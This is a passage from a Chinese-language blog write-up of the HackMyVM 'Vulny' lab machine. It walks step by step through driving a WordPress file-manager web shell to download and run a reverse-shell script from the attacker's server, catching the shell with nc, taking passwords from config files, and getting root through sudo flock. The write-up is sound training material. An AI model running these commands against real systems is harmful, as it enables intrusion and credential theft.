+Serving HTTP on 0.0.0.0 port 80 (http:&#x2F;&#x2F;0.0.0.0:80&#x2F;) ...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>在刚才的绝对路径下wget这个文件</p>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;192.168.134.90&#x2F;secret&#x2F;wp-content&#x2F;plugins&#x2F;wp-file-manager&#x2F;lib&#x2F;files&#x2F;shell.php?cmd&#x3D;wget%20192.168.134.76&#x2F;reverse.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;bash]
+└─# python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http:&#x2F;&#x2F;0.0.0.0:80&#x2F;) ...
+192.168.134.90 - - [01&#x2F;Jul&#x2F;2025 16:11:09] &quot;GET &#x2F;reverse.sh HTTP&#x2F;1.1&quot; 200 -
+^C
+Keyboard interrupt received, exiting.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>那么在本地nc监听1234端口，在绝对路径下运行这给脚本</p>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;192.168.134.90&#x2F;secret&#x2F;wp-content&#x2F;plugins&#x2F;wp-file-manager&#x2F;lib&#x2F;files&#x2F;shell.php?cmd&#x3D;bash reverse.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>拿到shell</p>
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;bash]
+└─# nc -lvnp 1234
+listening on [any] 1234 ...
+connect to [192.168.134.76] from (UNKNOWN) [192.168.134.90] 53370
+bash: cannot set terminal process group (683): Inappropriate ioctl for device
+bash: no job control in this shell
+&lt;ress&#x2F;wp-content&#x2F;plugins&#x2F;wp-file-manager&#x2F;lib&#x2F;files$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>在&#x2F;etc&#x2F;wordpress内找到了一个配置文件和一个目录</p>
+<pre class="line-numbers language-none"><code class="language-none">www-data@vulny:&#x2F;etc&#x2F;wordpress$ ls -al
+ls -al
+total 16
+drwxr-xr-x  2 root root 4096 Oct 15  2020 .
+drwxr-xr-x 99 root root 4096 Oct 15  2020 ..
+-rw-r--r--  1 root root  251 Oct 15  2020 config-192.168.1.122.php
+-rw-r--r--  1 root root  898 Dec 27  2019 htaccess
+www-data@vulny:&#x2F;etc&#x2F;wordpress$ cat config-192.168.1.122.php
+cat config-192.168.1.122.php
+&lt;?php
+define(&#39;DB_NAME&#39;, &#39;wordpress&#39;);
+define(&#39;DB_USER&#39;, &#39;wordpress&#39;);
+define(&#39;DB_PASSWORD&#39;, &#39;myfuckingpassword&#39;);
+define(&#39;DB_HOST&#39;, &#39;localhost&#39;);
+define(&#39;DB_COLLATE&#39;, &#39;utf8_general_ci&#39;);
+define(&#39;WP_CONTENT_DIR&#39;, &#39;&#x2F;usr&#x2F;share&#x2F;wordpress&#x2F;wp-content&#39;);
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>得到了数据库的密码<code>myfuckingpassword</code>,接着去<code>/usr/share/wordpress</code>路径下查看内容这里着重查看了web-connect.php文件</p>
+<pre class="line-numbers language-none"><code class="language-none">www-data@vulny:&#x2F;etc&#x2F;wordpress$ cd &#x2F;usr&#x2F;share&#x2F;wordpress
+cd &#x2F;usr&#x2F;share&#x2F;wordpress
+www-data@vulny:&#x2F;usr&#x2F;share&#x2F;wordpress$ ls -al
+ls -al
+total 200
+drwxr-xr-x   5 www-data www-data  4096 Oct 15  2020 .
+drwxr-xr-x 125 root     root      4096 Oct 15  2020 ..
+lrwxrwxrwx   1 www-data www-data    23 Jan 27  2020 .htaccess -&gt; &#x2F;etc&#x2F;wordpress&#x2F;htaccess
+-rw-r--r--   1 www-data www-data   420 Dec 27  2019 index.php
+-rw-r--r--   1 www-data www-data  7368 Oct 15  2020 readme.html
+-rw-r--r--   1 www-data www-data  7339 Jan 27  2020 wp-activate.php
+drwxr-xr-x   9 www-data www-data  4096 Oct 15  2020 wp-admin
+-rw-r--r--   1 www-data www-data   369 Dec 27  2019 wp-blog-header.php
+-rw-r--r--   1 www-data www-data  2340 Oct 15  2020 wp-comments-post.php
+-rw-r--r--   1 www-data www-data  2898 Dec 27  2019 wp-config-sample.php
+-rw-r--r--   1 www-data www-data  2404 Oct 15  2020 wp-config.php
+drwxrwxrwx   7 www-data www-data  4096 Oct 15  2020 wp-content
+-rw-r--r--   1 www-data www-data  3955 Dec 27  2019 wp-cron.php
+drwxr-xr-x  20 www-data www-data 12288 Oct 15  2020 wp-includes
+-rw-r--r--   1 www-data www-data  2504 Dec 27  2019 wp-links-opml.php
+-rw-r--r--   1 www-data www-data  3326 Dec 27  2019 wp-load.php
+-rw-r--r--   1 www-data www-data 47597 Dec 27  2019 wp-login.php
+-rw-r--r--   1 www-data www-data  8483 Dec 27  2019 wp-mail.php
+-rw-r--r--   1 www-data www-data 19120 Dec 27  2019 wp-settings.php
+-rw-r--r--   1 www-data www-data 31112 Dec 27  2019 wp-signup.php
+-rw-r--r--   1 www-data www-data  4764 Dec 27  2019 wp-trackback.php
+-rw-r--r--   1 www-data www-data  3150 Dec 27  2019 xmlrpc.php
+www-data@vulny:&#x2F;usr&#x2F;share&#x2F;wordpress$ cat wp-config.php
+cat wp-config.php
+&lt;?php
+&#x2F;***
+ * WordPress&#39;s Debianised default master config file
+ * Please do NOT edit and learn how the configuration works in
+ * &#x2F;usr&#x2F;share&#x2F;doc&#x2F;wordpress&#x2F;README.Debian
+ ***&#x2F;
+
+&#x2F;* Look up a host-specific config file in
+ * &#x2F;etc&#x2F;wordpress&#x2F;config-&lt;host&gt;.php or &#x2F;etc&#x2F;wordpress&#x2F;config-&lt;domain&gt;.php
+ *&#x2F;
+$debian_server &#x3D; preg_replace(&#39;&#x2F;:.*&#x2F;&#39;, &quot;&quot;, $_SERVER[&#39;HTTP_HOST&#39;]);
+$debian_server &#x3D; preg_replace(&quot;&#x2F;[^a-zA-Z0-9.\-]&#x2F;&quot;, &quot;&quot;, $debian_server);
+$debian_file &#x3D; &#39;&#x2F;etc&#x2F;wordpress&#x2F;config-&#39;.strtolower($debian_server).&#39;.php&#39;;
+&#x2F;* Main site in case of multisite with subdomains *&#x2F;
+$debian_main_server &#x3D; preg_replace(&quot;&#x2F;^[^.]*\.&#x2F;&quot;, &quot;&quot;, $debian_server);
+$debian_main_file &#x3D; &#39;&#x2F;etc&#x2F;wordpress&#x2F;config-&#39;.strtolower($debian_main_server).&#39;.php&#39;;
+
+if (file_exists($debian_file)) &#123;
+    require_once($debian_file);
+    define(&#39;DEBIAN_FILE&#39;, $debian_file);
+&#125; elseif (file_exists($debian_main_file)) &#123;
+    require_once($debian_main_file);
+    define(&#39;DEBIAN_FILE&#39;, $debian_main_file);
+&#125; elseif (file_exists(&quot;&#x2F;etc&#x2F;wordpress&#x2F;config-default.php&quot;)) &#123;
+    require_once(&quot;&#x2F;etc&#x2F;wordpress&#x2F;config-default.php&quot;);
+    define(&#39;DEBIAN_FILE&#39;, &quot;&#x2F;etc&#x2F;wordpress&#x2F;config-default.php&quot;);
+&#125; else &#123;
+    header(&quot;HTTP&#x2F;1.0 404 Not Found&quot;);
+    echo &quot;Neither &lt;b&gt;$debian_file&lt;&#x2F;b&gt; nor &lt;b&gt;$debian_main_file&lt;&#x2F;b&gt; could be found. &lt;br&#x2F;&gt; Ensure one of them exists, is readable by the webserver and contains the right password&#x2F;username.&quot;;
+    exit(1);
+&#125;
+
+&#x2F;* idrinksomewater *&#x2F;
+
+&#x2F;* Default value for some constants if they have not yet been set
+   by the host-specific config files *&#x2F;
+if (!defined(&#39;ABSPATH&#39;))
+    define(&#39;ABSPATH&#39;, &#39;&#x2F;usr&#x2F;share&#x2F;wordpress&#x2F;&#39;);
+if (!defined(&#39;WP_CORE_UPDATE&#39;))
+    define(&#39;WP_CORE_UPDATE&#39;, false);
+if (!defined(&#39;WP_ALLOW_MULTISITE&#39;))
+    define(&#39;WP_ALLOW_MULTISITE&#39;, true);
+if (!defined(&#39;DB_NAME&#39;))
+    define(&#39;DB_NAME&#39;, &#39;wordpress&#39;);
+if (!defined(&#39;DB_USER&#39;))
+    define(&#39;DB_USER&#39;, &#39;wordpress&#39;);
+if (!defined(&#39;DB_HOST&#39;))
+    define(&#39;DB_HOST&#39;, &#39;localhost&#39;);
+if (!defined(&#39;WP_CONTENT_DIR&#39;) &amp;&amp; !defined(&#39;DONT_SET_WP_CONTENT_DIR&#39;))
+    define(&#39;WP_CONTENT_DIR&#39;, &#39;&#x2F;var&#x2F;lib&#x2F;wordpress&#x2F;wp-content&#39;);
+
+&#x2F;* Default value for the table_prefix variable so that it doesn&#39;t need to
+   be put in every host-specific config file *&#x2F;
+if (!isset($table_prefix)) &#123;
+    $table_prefix &#x3D; &#39;wp_&#39;;
+&#125;
+
+if (isset($_SERVER[&#39;HTTP_X_FORWARDED_PROTO&#39;]) &amp;&amp; $_SERVER[&#39;HTTP_X_FORWARDED_PROTO&#39;] &#x3D;&#x3D; &#39;https&#39;)
+    $_SERVER[&#39;HTTPS&#39;] &#x3D; &#39;on&#39;;
+
+require_once(ABSPATH . &#39;wp-settings.php&#39;);
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>在这个文件内，看到了一个注释的内容<code>idrinksomewater</code>并且发现home目录下有一个用户名<code>adrian</code></p>
+<p>猜测是adrian用户的密码<code>adrian:idrinksomewater</code></p>
+<p>由于没有22ssh端口的开放，因此只能本地登陆了</p>
+<h2 id="本地登陆"><a href="#本地登陆" class="headerlink" title="本地登陆"></a>本地登陆</h2><pre class="line-numbers language-none"><code class="language-none">www-data@vulny:&#x2F;usr&#x2F;share&#x2F;wordpress$ su - adrian
+su - adrian
+Password: idrinksomewater
+
+adrian@vulny:~$ id
+id
+uid&#x3D;1000(adrian) gid&#x3D;1000(adrian) groups&#x3D;1000(adrian),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="userflag"><a href="#userflag" class="headerlink" title="userflag"></a>userflag</h3><pre class="line-numbers language-none"><code class="language-none">adrian@vulny:~$ pwd
+pwd
+&#x2F;home&#x2F;adrian
+adrian@vulny:~$ ls -al
+ls -al
+total 40
+drwxr-xr-x 4 adrian adrian 4096 Jul  1 20:35 .
+drwxr-xr-x 3 root   root   4096 Oct 15  2020 ..
+-rw------- 1 adrian adrian   12 Jul  1 20:35 .bash_history
+-rw-r--r-- 1 adrian adrian  220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 adrian adrian 3771 Feb 25  2020 .bashrc
+drwx------ 2 adrian adrian 4096 Oct 15  2020 .cache
+drwxrwxr-x 3 adrian adrian 4096 Oct 15  2020 .local
+-rw-r--r-- 1 adrian adrian  807 Feb 25  2020 .profile
+-rw-r--r-- 1 adrian adrian    0 Oct 15  2020 .sudo_as_admin_successful
+-rw------- 1 adrian adrian   16 Oct 15  2020 user.txt
+-rw------- 1 adrian adrian   51 Oct 15  2020 .Xauthority
+adrian@vulny:~$ cat user.txt
+cat user.txt
+HMViuploadfiles<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>查看sudo权限</p>
+<pre class="line-numbers language-none"><code class="language-none">adrian@vulny:~$ sudo -l
+sudo -l
+Matching Defaults entries for adrian on vulny:
+    env_reset, mail_badpass,
+    secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin
+
+User adrian may run the following commands on vulny:
+    (ALL : ALL) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;flock<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>可以以root的身份运行flock，在<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/flock/">gtfobins</a>内找到了提权方案可以这样进行提权</p>
+<p><img src="/posts/b2347fd8/image-20250702045046489.png" alt="image-20250702045046489"></p>
+<pre class="line-numbers language-none"><code class="language-none">adrian@vulny:~$ sudo flock -u &#x2F; &#x2F;bin&#x2F;sh
+sudo flock -u &#x2F; &#x2F;bin&#x2F;sh
+# bash
+bash
+root@vulny:&#x2F;home&#x2F;adrian# id
+id
+uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="rootflag"><a href="#rootflag" class="headerlink" title="rootflag"></a>rootflag</h3><pre class="line-numbers language-none"><code class="language-none">root@vulny:&#x2F;home&#x2F;adrian# cd &#x2F;root
+cd &#x2F;root
+root@vulny:~# ls -al
+ls -al
+total 40
+drwx------  5 root root 4096 Oct 15  2020 .
+drwxr-xr-x 20 root root 4096 Oct 15  2020 ..
+-rw-------  1 root root    5 Oct 15  2020 .bash_history
+-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
+drwxr-xr-x  3 root root 4096 Oct 15  2020 .local
+-rw-------  1 root root  182 Oct 15  2020 .mysql_history
+-rw-r--r--  1 root root  161 Dec  5  2019 .profile
+-rw-------  1 root root   10 Oct 15  2020 root.txt
+drwxr-xr-x  3 root root 4096 Oct 15  2020 snap
+drwx------  2 root root 4096 Oct 15  2020 .ssh
+root@vulny:~# cat root.txt
+cat root.txt
+HMVididit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://drume2.github.io">Morii</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://drume2.github.io/posts/b2347fd8.html">https://drume2.github.io/posts/b2347fd8.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://drume2.github.io" target="_blank">Moriiの博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/HMV/">HMV</a></div><div class="post_share"><div class="social-share" data-image="https://npm.elemecdn.com/xianqi-hexo/imgg/1.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/gh/overtrue/share.js@master/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/posts/e071dd2c.html"><img class="next-cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">HMV-Nexus</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/7ffe1a8a.html" title="HMV-Alzheimer"><img class="cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/10.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-26</div><div class="title">HMV-Alzheimer</div></div></a></div><div><a href="/posts/3bb8f4e6.html" title="HMV-Concole"><img class="cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/5.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-27</div><div class="title">HMV-Concole</div></div></a></div><div><a href="/posts/576162f9.html" title="HMV-Devoops"><img class="cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/16.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-20</div><div class="title">HMV-Devoops</div></div></a></div><div><a href="/posts/997d3111.html" title="HMV-Helium"><img class="cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/9.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-25</div><div class="title">HMV-Helium</div></div></a></div><div><a href="/posts/84d43366.html" title="HMV-Hommie"><img class="cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/4.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-27</div><div class="title">HMV-Hommie</div></div></a></div><div><a href="/posts/e071dd2c.html" title="HMV-Nexus"><img class="cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-02</div><div class="title">HMV-Nexus</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Twikoo</span><span class="switch-btn"></span><span class="second-comment">Valine</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://imgtu.com/uploads/1jto6hwz/r-file_64e053.webp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Morii</div><div class="author-info__description">博客因兴趣诞生,在不断完善中</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">15</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><a id="card-info-btn"><i class="fab fa-home"></i><span>个人主页</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Drume1/drume1.github.io" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="tencent://AddContact/?fromId=45&amp;fromSubId=1&amp;subcmd=all&amp;uin=1159927667&amp;website=www.qtxml.cn" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">兴趣爱好才是最大的动力，何不与我共同来攀知识高峰，品翘楚美人！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HMV-Vulny"><span class="toc-number">1.</span> <span class="toc-text">HMV-Vulny</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text">信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F"><span class="toc-number">1.1.1.</span> <span class="toc-text">扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.1.2.</span> <span class="toc-text">反弹shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E7%99%BB%E9%99%86"><span class="toc-number">1.2.</span> <span class="toc-text">本地登陆</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#userflag"><span class="toc-number">1.2.1.</span> <span class="toc-text">userflag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rootflag"><span class="toc-number">1.2.2.</span> <span class="toc-text">rootflag</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/b2347fd8.html" title="HMV-Vulny"><img src="https://npm.elemecdn.com/xianqi-hexo/imgg/1.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HMV-Vulny"/></a><div class="content"><a class="title" href="/posts/b2347fd8.html" title="HMV-Vulny">HMV-Vulny</a><time datetime="2025-07-01T19:26:22.000Z" title="发表于 2025-07-02 03:26:22">2025-07-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/e071dd2c.html" title="HMV-Nexus"><img src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HMV-Nexus"/></a><div class="content"><a class="title" href="/posts/e071dd2c.html" title="HMV-Nexus">HMV-Nexus</a><time datetime="2025-07-01T18:27:42.000Z" title="发表于 2025-07-02 02:27:42">2025-07-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/185bd5a3.html" title="HMV-UMZ"><img src="https://npm.elemecdn.com/xianqi-hexo/imgg/3.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HMV-UMZ"/></a><div class="content"><a class="title" href="/posts/185bd5a3.html" title="HMV-UMZ">HMV-UMZ</a><time datetime="2025-07-01T15:20:16.000Z" title="发表于 2025-07-01 23:20:16">2025-07-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/84d43366.html" title="HMV-Hommie"><img src="https://npm.elemecdn.com/xianqi-hexo/imgg/4.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HMV-Hommie"/></a><div class="content"><a class="title" href="/posts/84d43366.html" title="HMV-Hommie">HMV-Hommie</a><time datetime="2025-06-27T11:18:25.000Z" title="发表于 2025-06-27 19:18:25">2025-06-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/3bb8f4e6.html" title="HMV-Concole"><img src="https://npm.elemecdn.com/xianqi-hexo/imgg/5.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HMV-Concole"/></a><div class="content"><a class="title" href="/posts/3bb8f4e6.html" title="HMV-Concole">HMV-Concole</a><time datetime="2025-06-27T06:01:51.000Z" title="发表于 2025-06-27 14:01:51">2025-06-27</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;undefined - 2025  <i id="heartbeat" class="fa fas fa-heartbeat"></i> Morii</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div><<head><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"></head></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><div class="js-pjax"><script>(()=>{
+  const init = () => {
+    twikoo.init(Object.assign({
+      el: '#twikoo-wrap',
+      envId: 'https://twikooo-one.vercel.app/',
+      region: 'us-east-1',
+      onCommentLoaded: function () {
+        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
+      }
+    }, null))
+  }
+
+  const getCount = () => {
+    const countELement = document.getElementById('twikoo-count')
+    if(!countELement) return
+    twikoo.getCommentsCount({
+      envId: 'https://twikooo-one.vercel.app/',
+      region: 'us-east-1',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(function (res) {
+      countELement.innerText = res[0].count
+    }).catch(function (err) {
+      console.error(err);
+    });
+  }
+
+  const runFn = () => {
+    init()
+    GLOBAL_CONFIG_SITE.isPost && getCount()
+  }
+
+  const loadTwikoo = () => {
+    if (typeof twikoo === 'object') {
+      setTimeout(runFn,0)
+      return
+    } 
+    getScript('https://cdn.jsdelivr.net/npm/twikoo@1/dist/twikoo.all.min.js').then(runFn)
+  }
+
+  if ('Twikoo' === 'Twikoo' || !true) {
+    if (true) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else loadTwikoo()
+  } else {
+    window.loadOtherComment = () => {
+      loadTwikoo()
+    }
+  }
+})()</script><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'BF23duYcvhYPZIqUHv6NigOn-MdYXbMMI',
+      appKey: 'Bb6SG97mQjBt3SKeopWEnnQU',
+      avatar: 'monsterid',
+      serverURLs: 'https://bf23duyc.api.lncldglobal.com',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Twikoo' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script defer data-pjax type="text/javascript" src="https://npm.elemecdn.com/xianqi-hexo/js/animate.js"></script><div class="aplayer no-destroy" data-id="3485712867" data-server="tencent" data-type="playlist" data-fixed="true" data-mini="true" data-listFolded="false" data-order="random" data-preload="auto" data-autoplay="false" muted></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script src="//code.tidio.co/null.js" async="async"></script><script>function onTidioChatApiReady() {
+  window.tidioChatApi.hide();
+  window.tidioChatApi.on("close", function() {
+    window.tidioChatApi.hide();
+  });
+}
+if (window.tidioChatApi) {
+  window.tidioChatApi.on("ready", onTidioChatApiReady);
+} else {
+  document.addEventListener("tidioChat-ready", onTidioChatApiReady);
+}
+
+var chatBtnFn = () => {
+  document.getElementById("chat_btn").addEventListener("click", function(){
+    window.tidioChatApi.show();
+    window.tidioChatApi.open();
+  });
+}
+chatBtnFn()
+</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer@1/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show","#posts-chart","#tags-chart","#categories-chart",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  typeof preloader === 'object' && preloader.initLoading()
